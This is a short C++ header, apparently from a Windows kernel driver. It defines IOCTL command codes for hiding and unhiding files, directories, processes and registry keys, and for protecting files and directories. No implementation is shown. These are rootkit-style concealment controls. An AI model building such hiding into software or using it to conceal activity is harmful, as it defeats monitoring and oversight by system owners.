#pragma once

#include "../std/memory/memory.h"
#include "../std/string/string.h"
#include "../std/vector/vector.h"
#include "../std/sync/mutex.h"

#include "../process/ps-monitor.h"
#include "../template/register.h"
#include "../template/flt-ex.h"
#include "../protect/file-protect.h"
#include "../protect/proc-protect.h"
#include "../hide/hide-file.h"

typedef enum IOCTL_CMD_CLASS
{
	kHideFile = 0x80002000,
	kHideDir = 0x80002001,
	kUnhideFile = 0x80002002,
	kUnhideDir = 0x80002003,
	kHideProc = 0x80002004,
	kUnhideProc = 0x80002005,
	kHideReg = 0x80002006,
	kUnhideReg = 0x80002007,

	kProctectFile = 0x80002008,
	kUnproctectFile = 0x80002009,
	kProctectDir = 0x8000200A,
	kUnproctectDir = 0x8000200B
};

typedef struct IOCTL_CMD
{
	IOCTL_CMD_CLASS cmd_class;
	ULONG size;
	char data[1];
} IOCTL_CMD, * PIOCTL_CMD;